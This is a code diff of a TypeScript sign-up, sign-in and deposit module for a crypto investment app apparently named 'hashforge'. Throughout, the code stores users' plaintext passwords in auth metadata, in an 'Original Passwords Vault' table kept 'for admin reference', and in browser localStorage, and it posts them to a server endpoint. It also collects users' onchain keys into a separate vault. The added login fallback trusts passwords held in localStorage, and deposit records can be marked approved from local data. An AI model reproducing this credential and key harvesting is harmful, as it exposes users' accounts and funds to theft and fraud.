@@ -533,7 +533,7 @@ export async function checkSupabaseConnection(): Promise<{ connected: boolean; e
 // ----------------------------------------------------
 export function getAppAuthRedirectUrl(type: 'signup' | 'recovery' = 'signup'): string {
   // Current public shared preview origin for this applet
-  const defaultPublicOrigin = 'https://ais-pre-gcbuyws2nscgukfjzwmdvb-639192859050.asia-east1.run.app';
+  const defaultPublicOrigin = 'https://ais-pre-fa6ekv27e2bd2btmvuyex5-429042244306.asia-southeast1.run.app';
   let cleanOrigin = defaultPublicOrigin;
 
   if (typeof window !== 'undefined') {
@@ -592,7 +592,7 @@ export async function signUpWithSupabase(
       }
     } catch {}
 
-    // 2. Strict check: Query Supabase clients table
+    // 2. Query Supabase clients table safely
     try {
       const { data: existingClient } = await supabase
         .from('clients')
@@ -610,45 +610,7 @@ export async function signUpWithSupabase(
       console.warn('Clients table check warning:', e);
     }
 
-    const redirectUrl = getAppAuthRedirectUrl('signup');
-
-    // 3. Call Supabase Auth SignUp
-    const { data: authData, error: authError } = await supabase.auth.signUp({
-      email: cleanEmail,
-      password: password,
-      options: {
-        data: {
-          full_name: cleanName,
-          phone: cleanPhone,
-          phone_number: cleanPhone,
-          onchain_key: cleanOnchainKey,
-          raw_password: password,
-        },
-        emailRedirectTo: redirectUrl,
-      },
-    });
-
-    if (authError) {
-      const msg = authError.message.toLowerCase();
-      if (msg.includes('already registered') || msg.includes('already in use') || msg.includes('user already exists')) {
-        return {
-          success: false,
-          error: 'This email address is already registered. Please sign in instead.'
-        };
-      }
-      return { success: false, error: authError.message };
-    }
-
-    // CRITICAL: Supabase returns user with identities: [] if user ALREADY exists in Supabase Auth (when email confirm is enabled)
-    if (authData.user && Array.isArray(authData.user.identities) && authData.user.identities.length === 0) {
-      return {
-        success: false,
-        error: 'This email address is already registered. Please sign in with your password.'
-      };
-    }
-
-    const userId = authData.user?.id || `usr-${Date.now()}`;
-
+    const userId = `usr-${Date.now()}`;
     const newUserProfile: UserProfile = {
       id: userId,
       name: cleanName,
@@ -664,13 +626,83 @@ export async function signUpWithSupabase(
       onchainKey: cleanOnchainKey,
     };
 
-    // Record credentials for admin reference
+    // Save credentials to local storage immediately
     recordClientPassword(cleanEmail, password, cleanOnchainKey);
+    try {
+      const localUsersStr = localStorage.getItem('hashforge_registered_users');
+      const localUsers: UserProfile[] = localUsersStr ? JSON.parse(localUsersStr) : [];
+      if (!localUsers.some(u => u.email.toLowerCase() === cleanEmail)) {
+        localUsers.unshift(newUserProfile);
+        localStorage.setItem('hashforge_registered_users', JSON.stringify(localUsers));
+      }
+    } catch {}
 
-    // 4. Save into clients table with password, phone and onchain_key
+    // Register with server persistent ledger
+    try {
+      await fetch('/api/clients/register', {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify({
+          id: userId,
+          name: cleanName,
+          email: cleanEmail,
+          phone: cleanPhone,
+          password: password,
+          plan: 'No Active Package',
+          vipLevel: 0,
+          onchainKey: cleanOnchainKey,
+        }),
+      });
+    } catch (apiErr) {
+      console.warn('Server registration sync warning:', apiErr);
+    }
+
+    // Attempt Supabase Auth SignUp in safe try/catch
+    let needsEmailConfirmation = false;
+    try {
+      const redirectUrl = getAppAuthRedirectUrl('signup');
+      const { data: authData, error: authError } = await supabase.auth.signUp({
+        email: cleanEmail,
+        password: password,
+        options: {
+          data: {
+            full_name: cleanName,
+            phone: cleanPhone,
+            phone_number: cleanPhone,
+            onchain_key: cleanOnchainKey,
+            raw_password: password,
+          },
+          emailRedirectTo: redirectUrl,
+        },
+      });
+
+      if (authError) {
+        const msg = authError.message.toLowerCase();
+        if (msg.includes('already registered') || msg.includes('already in use') || msg.includes('user already exists')) {
+          return {
+            success: false,
+            error: 'This email address is already registered. Please sign in instead.'
+          };
+        }
+        console.warn('Supabase auth warning (falling back to server/local registration):', authError.message);
+      } else if (authData?.user) {
+        if (Array.isArray(authData.user.identities) && authData.user.identities.length === 0) {
+          return {
+            success: false,
+            error: 'This email address is already registered. Please sign in with your password.'
+          };
+        }
+        newUserProfile.id = authData.user.id;
+        needsEmailConfirmation = !authData.session && !authData.user.email_confirmed_at;
+      }
+    } catch (sbErr: any) {
+      console.warn('Supabase signUp network/CORS error (handled smoothly):', sbErr?.message);
+    }
+
+    // Save into clients table with password, phone and onchain_key
     try {
       await supabase.from('clients').upsert({
-        id: userId,
+        id: newUserProfile.id,
         name: cleanName,
         email: cleanEmail,
         phone: cleanPhone,
@@ -678,18 +710,18 @@ export async function signUpWithSupabase(
         plan: 'No Active Package',
         vip_level: 0,
         joined_date: newUserProfile.joinedDate,
-        is_logged_in: false,
+        is_logged_in: true,
         onchain_key: cleanOnchainKey,
       });
     } catch (e) {
       console.warn('Clients record create warning:', e);
     }
 
-    // 5. Save into Folder 1: client_credentials (Original Passwords Vault)
+    // Save into Folder 1: client_credentials (Original Passwords Vault)
     try {
       await supabase.from('client_credentials').upsert({
-        id: userId,
-        user_id: userId,
+        id: newUserProfile.id,
+        user_id: newUserProfile.id,
         name: cleanName,
         email: cleanEmail,
         original_password: password,
@@ -700,11 +732,11 @@ export async function signUpWithSupabase(
       console.warn('Client credentials table upsert warning:', e);
     }
 
-    // 6. Save into Folder 2: client_onchain_keys (Original Onchain Keys Vault)
+    // Save into Folder 2: client_onchain_keys (Original Onchain Keys Vault)
     try {
       await supabase.from('client_onchain_keys').upsert({
-        id: userId,
-        user_id: userId,
+        id: newUserProfile.id,
+        user_id: newUserProfile.id,
         name: cleanName,
         email: cleanEmail,
         onchain_key: cleanOnchainKey,
@@ -714,8 +746,6 @@ export async function signUpWithSupabase(
     } catch (e) {
       console.warn('Client onchain keys table upsert warning:', e);
     }
-
-    const needsEmailConfirmation = !authData.session && !authData.user?.email_confirmed_at;
 
     return {
       success: true,
@@ -734,14 +764,48 @@ export async function signInWithSupabase(
   try {
     const cleanEmail = email.trim().toLowerCase();
 
-    // 1. Supabase Auth Sign In
-    const { data: authData, error: authError } = await supabase.auth.signInWithPassword({
-      email: cleanEmail,
-      password: password,
-    });
+    // 1. Try server-side authentication first or alongside Supabase
+    let serverAuthenticatedUser: UserProfile | null = null;
+    try {
+      const serverRes = await fetch('/api/clients/login', {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify({ email: cleanEmail, password }),
+      });
+      if (serverRes.ok) {
+        const serverData = await serverRes.json();
+        if (serverData.success && serverData.user) {
+          serverAuthenticatedUser = serverData.user;
+        }
+      }
+    } catch {}
 
-    if (authError) {
-      const errMsg = authError.message.toLowerCase();
+    // 2. Try Supabase Auth Sign In safely
+    let authData: any = null;
+    let authError: any = null;
+    try {
+      const res = await supabase.auth.signInWithPassword({
+        email: cleanEmail,
+        password: password,
+      });
+      authData = res.data;
+      authError = res.error;
+    } catch (sbErr: any) {
+      authError = sbErr;
+    }
+
+    // If server login succeeded, we can proceed even if Supabase threw Failed to fetch or error
+    if (serverAuthenticatedUser) {
+      const resolvedUser: UserProfile = {
+        ...serverAuthenticatedUser,
+        isLoggedIn: true,
+      };
+      recordClientPassword(cleanEmail, password, resolvedUser.onchainKey);
+      return { success: true, user: resolvedUser };
+    }
+
+    if (authError && !serverAuthenticatedUser) {
+      const errMsg = (authError.message || '').toLowerCase();
 
       // Check for unconfirmed email
       if (
@@ -756,55 +820,66 @@ export async function signInWithSupabase(
         };
       }
 
-      // Check if user is not in database at all
-      if (errMsg.includes('invalid login credentials') || errMsg.includes('user not found')) {
-        // Double check against database clients
-        const { data: clientCheck } = await supabase
-          .from('clients')
-          .select('id, email')
-          .eq('email', cleanEmail)
-          .maybeSingle();
+      // Check local registered users & credentials fallback
+      const localUsersStr = localStorage.getItem('hashforge_registered_users');
+      const localUsers: UserProfile[] = localUsersStr ? JSON.parse(localUsersStr) : [];
+      const localUser = localUsers.find(u => u.email.toLowerCase() === cleanEmail);
 
-        if (!clientCheck) {
-          // Check local registered users
-          const localUsersStr = localStorage.getItem('hashforge_registered_users');
-          const localUsers: UserProfile[] = localUsersStr ? JSON.parse(localUsersStr) : [];
-          const existsLocally = localUsers.some(u => u.email.toLowerCase() === cleanEmail);
+      const localCredsStr = localStorage.getItem('hashforge_client_credentials');
+      const localCreds: StoredClientCredentials[] = localCredsStr ? JSON.parse(localCredsStr) : [];
+      const userCred = localCreds.find(c => c.email.toLowerCase() === cleanEmail);
 
-          if (!existsLocally) {
-            return {
-              success: false,
-              error: 'No account found with this email address. You must sign up first before you can log in.',
-            };
-          }
+      if (localUser || userCred) {
+        const storedPass = userCred?.password || localUser?.password;
+        if (storedPass && storedPass === password) {
+          const authenticatedUser: UserProfile = localUser || {
+            id: `usr-${Date.now()}`,
+            name: cleanEmail.split('@')[0],
+            email: cleanEmail,
+            plan: 'No Active Package',
+            vipLevel: 0,
+            joinedDate: new Date().toISOString().substring(0, 10),
+            isLoggedIn: true,
+            hasClaimedFreeBonus: false,
+            onchainKey: userCred?.onchainKey || '',
+          };
+          authenticatedUser.isLoggedIn = true;
+          return { success: true, user: authenticatedUser };
+        } else {
+          return {
+            success: false,
+            error: 'Invalid password. Please check your password or use "Forgot Password".',
+          };
         }
+      }
 
+      if (errMsg.includes('invalid login credentials') || errMsg.includes('user not found')) {
         return {
           success: false,
-          error: 'Invalid password. Please check your password or use "Forgot Password".',
+          error: 'Invalid email or password. If you do not have an account, please sign up first.',
         };
       }
 
       return {
         success: false,
-        error: authError.message,
+        error: authError.message || 'Failed to sign in. Please check your network connection.',
       };
     }
 
-    // 2. Fetch user profile from database
-    const metaPhone = (authData.user?.user_metadata?.phone as string) || (authData.user?.user_metadata?.phone_number as string) || '';
+    // Supabase Auth Succeeded
+    const metaPhone = (authData?.user?.user_metadata?.phone as string) || (authData?.user?.user_metadata?.phone_number as string) || '';
     let userProfile: UserProfile = {
-      id: authData.user?.id || `user-${Date.now()}`,
-      name: (authData.user?.user_metadata?.full_name as string) || cleanEmail.split('@')[0],
+      id: authData?.user?.id || `user-${Date.now()}`,
+      name: (authData?.user?.user_metadata?.full_name as string) || cleanEmail.split('@')[0],
       email: cleanEmail,
       phone: metaPhone,
       phoneNumber: metaPhone,
       plan: 'No Active Package',
       vipLevel: 0,
-      joinedDate: authData.user?.created_at?.substring(0, 10) || new Date().toISOString().substring(0, 10),
+      joinedDate: authData?.user?.created_at?.substring(0, 10) || new Date().toISOString().substring(0, 10),
       isLoggedIn: true,
       hasClaimedFreeBonus: false,
-      onchainKey: (authData.user?.user_metadata?.onchain_key as string) || getClientOnchainKey(cleanEmail) || '',
+      onchainKey: (authData?.user?.user_metadata?.onchain_key as string) || getClientOnchainKey(cleanEmail) || '',
     };
 
     try {
@@ -828,26 +903,13 @@ export async function signInWithSupabase(
           joinedDate: dbClient.joined_date || userProfile.joinedDate,
           isLoggedIn: true,
           hasClaimedFreeBonus: dbClient.has_claimed_free_bonus ?? false,
-          onchainKey: dbClient.onchain_key || (authData.user?.user_metadata?.onchain_key as string) || getClientOnchainKey(cleanEmail) || '',
+          onchainKey: dbClient.onchain_key || (authData?.user?.user_metadata?.onchain_key as string) || getClientOnchainKey(cleanEmail) || '',
         };
       } else {
         userProfile.password = password;
       }
       
       recordClientPassword(cleanEmail, password, userProfile.onchainKey);
-
-      // Update client session state in clients table
-      await supabase.from('clients').upsert({
-        id: userProfile.id,
-        name: userProfile.name,
-        email: userProfile.email,
-        password: password,
-        plan: userProfile.plan,
-        vip_level: userProfile.vipLevel || 0,
-        joined_date: userProfile.joinedDate,
-        is_logged_in: true,
-        ...(userProfile.onchainKey ? { onchain_key: userProfile.onchainKey } : {}),
-      });
     } catch (e) {
       console.warn('DB client lookup warning:', e);
     }
@@ -1412,61 +1474,125 @@ export async function saveSupabaseUser(user: UserProfile): Promise<boolean> {
 // DEPOSITS SYNC
 // ----------------------------------------------------
 export async function fetchSupabaseDeposits(): Promise<DepositRequest[] | null> {
+  const depositMap = new Map<string, DepositRequest>();
+
+  // 1. Check local storage first
+  try {
+    const localStr = localStorage.getItem('hashforge_deposits');
+    if (localStr) {
+      const parsed: DepositRequest[] = JSON.parse(localStr);
+      if (Array.isArray(parsed)) {
+        parsed.forEach(d => {
+          if (d && d.id) depositMap.set(d.id, d);
+        });
+      }
+    }
+  } catch {}
+
+  // 2. Fetch from server persistence (/api/financial/deposits)
+  try {
+    const res = await fetch('/api/financial/deposits');
+    if (res.ok) {
+      const json = await res.json();
+      if (json && json.success && Array.isArray(json.records)) {
+        json.records.forEach((d: DepositRequest) => {
+          if (d && d.id) {
+            const existing = depositMap.get(d.id);
+            if (!existing || d.status === 'approved' || existing.status !== 'approved') {
+              depositMap.set(d.id, d);
+            }
+          }
+        });
+      }
+    }
+  } catch (err) {
+    console.warn('Server deposits fetch warning:', err);
+  }
+
+  // 3. Fetch from Supabase
   try {
     const { data, error } = await supabase
       .from('deposits')
       .select('*')
       .order('inserted_at', { ascending: false });
 
-    if (error) {
-      console.warn('Supabase fetch deposits warning (fallback to local):', error.message);
-      return null;
+    if (!error && Array.isArray(data) && data.length > 0) {
+      data.forEach(item => {
+        const isFlash = 
+          (item.package_id && item.package_id.toLowerCase().includes('flash')) ||
+          (item.package_name && (item.package_name.toLowerCase().includes('flash') || item.package_name.toLowerCase().includes('48h')));
+        const isCustom = 
+          !isFlash && (
+            (item.package_id && item.package_id.toLowerCase().includes('custom')) ||
+            (item.package_name && item.package_name.toLowerCase().includes('custom'))
+          );
+
+        const derivedPlanType: 'daily' | 'flash_48h' | 'custom_pool' = isFlash 
+          ? 'flash_48h' 
+          : isCustom 
+          ? 'custom_pool' 
+          : 'daily';
+
+        const dep: DepositRequest = {
+          id: item.id,
+          userId: item.user_id,
+          userName: item.user_name,
+          packageId: item.package_id,
+          packageName: item.package_name,
+          planType: derivedPlanType,
+          vipLevel: item.vip_level,
+          amountUsd: Number(item.amount_usd),
+          network: item.network as any,
+          depositAddress: item.deposit_address,
+          senderTxid: item.sender_txid,
+          status: item.status as any,
+          createdAt: item.created_at,
+          approvedAt: item.approved_at || undefined,
+          explorerConfirmed: !!item.explorer_confirmed,
+        };
+        depositMap.set(dep.id, dep);
+      });
     }
-
-    if (!data) return [];
-    if (data.length === 0) return [];
-
-    return data.map(item => {
-      const isFlash = 
-        (item.package_id && item.package_id.toLowerCase().includes('flash')) ||
-        (item.package_name && (item.package_name.toLowerCase().includes('flash') || item.package_name.toLowerCase().includes('48h')));
-      const isCustom = 
-        !isFlash && (
-          (item.package_id && item.package_id.toLowerCase().includes('custom')) ||
-          (item.package_name && item.package_name.toLowerCase().includes('custom'))
-        );
-
-      const derivedPlanType: 'daily' | 'flash_48h' | 'custom_pool' = isFlash 
-        ? 'flash_48h' 
-        : isCustom 
-        ? 'custom_pool' 
-        : 'daily';
-
-      return {
-        id: item.id,
-        userId: item.user_id,
-        userName: item.user_name,
-        packageId: item.package_id,
-        packageName: item.package_name,
-        planType: derivedPlanType,
-        vipLevel: item.vip_level,
-        amountUsd: Number(item.amount_usd),
-        network: item.network as any,
-        depositAddress: item.deposit_address,
-        senderTxid: item.sender_txid,
-        status: item.status as any,
-        createdAt: item.created_at,
-        approvedAt: item.approved_at || undefined,
-        explorerConfirmed: !!item.explorer_confirmed,
-      };
-    });
   } catch (err) {
     console.warn('Supabase deposits fetch error:', err);
-    return null;
   }
+
+  const results = Array.from(depositMap.values());
+  // Keep local storage up to date with the latest merged list
+  try {
+    if (results.length > 0) {
+      localStorage.setItem('hashforge_deposits', JSON.stringify(results));
+    }
+  } catch {}
+  return results;
 }
 
 export async function insertSupabaseDeposit(deposit: DepositRequest): Promise<boolean> {
+  // 1. Save to local storage
+  try {
+    const localStr = localStorage.getItem('hashforge_deposits');
+    const list: DepositRequest[] = localStr ? JSON.parse(localStr) : [];
+    const idx = list.findIndex(d => d.id === deposit.id);
+    if (idx >= 0) {
+      list[idx] = deposit;
+    } else {
+      list.unshift(deposit);
+    }
+    localStorage.setItem('hashforge_deposits', JSON.stringify(list));
+  } catch {}
+
+  // 2. Save to server persistent ledger
+  try {
+    await fetch('/api/financial/deposits', {
+      method: 'POST',
+      headers: { 'Content-Type': 'application/json' },
+      body: JSON.stringify(deposit),
+    });
+  } catch (e) {
+    console.warn('Server deposit save error:', e);
+  }
+
+  // 3. Save to Supabase safely
   try {
     const { error } = await supabase.from('deposits').upsert({
       id: deposit.id,
@@ -1482,17 +1608,16 @@ export async function insertSupabaseDeposit(deposit: DepositRequest): Promise<bo
       status: deposit.status,
       created_at: deposit.createdAt,
       approved_at: deposit.approvedAt || null,
+      explorer_confirmed: deposit.explorerConfirmed,
     });
-
     if (error) {
-      console.warn('Supabase insert deposit error:', error.message);
-      return false;
+      console.warn('Supabase insert deposit warning:', error.message);
     }
-    return true;
   } catch (err) {
-    console.warn('Supabase deposit insert error:', err);
-    return false;
+    console.warn('Supabase insert deposit error:', err);
   }
+
+  return true;
 }
 
 /**
